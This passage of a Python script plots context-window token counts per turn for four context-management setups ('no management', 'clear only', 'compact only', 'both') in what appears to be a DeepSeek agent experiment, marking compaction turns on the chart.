    return [(int(r["turn"]), int(r["tokens"]), r["action"]) for r in csv.DictReader(open(os.path.join(REPEAT, "%s-1.csv" % name)))]
d = Diagram(1200, 560)
d.title(40, 44, "Window size per turn, first real run of each setup (DeepSeek, 24 files)")
X0, X1, Y0, Y1, TMAX, XMAX = 110, 1150, 500, 120, 27000, 30
sx = lambda t: X0 + (t - 1) * (X1 - X0) / (XMAX - 1); sy = lambda v: Y0 - v * (Y0 - Y1) / TMAX
for v in (0, 5000, 10000, 15000, 20000, 25000):
    d.line(X0, sy(v), X1, sy(v), color="#e2ddd3", width=1); d.text(X0 - 12, sy(v) + 6, "{:,}".format(v), 17, "#6b6b6b", 600, "end")
for t in (1, 5, 10, 15, 20, 25, 30):
    d.text(sx(t), Y0 + 28, str(t), 17, "#6b6b6b", 600, "middle")
d.text((X0 + X1) / 2, Y0 + 52, "turn", 18, "#6b6b6b", 700, "middle")
for k, (name, label, color) in enumerate([("without", "no management", "#8a8a8a"), ("clear", "clear only", "#d4600b"), ("compact", "compact only", "#2b6cb0"), ("both", "both", "#1f7a4d")]):
    pts = _series(name)
    for (t1, v1, _), (t2, v2, _) in zip(pts, pts[1:]):
        d.line(sx(t1), sy(v1), sx(t2), sy(v2), color=color, width=4)
    for t, v, a in pts:
        if a.startswith("compact"): d.dot(sx(t), sy(v), r=7, color=color)
    d.bar(X0 + 20 + k * 250, 86, 28, 10, color=color); d.text(X0 + 56 + k * 250, 98, label, 19, "#1f1f1f", 700)
save(d, "ep05-chart")
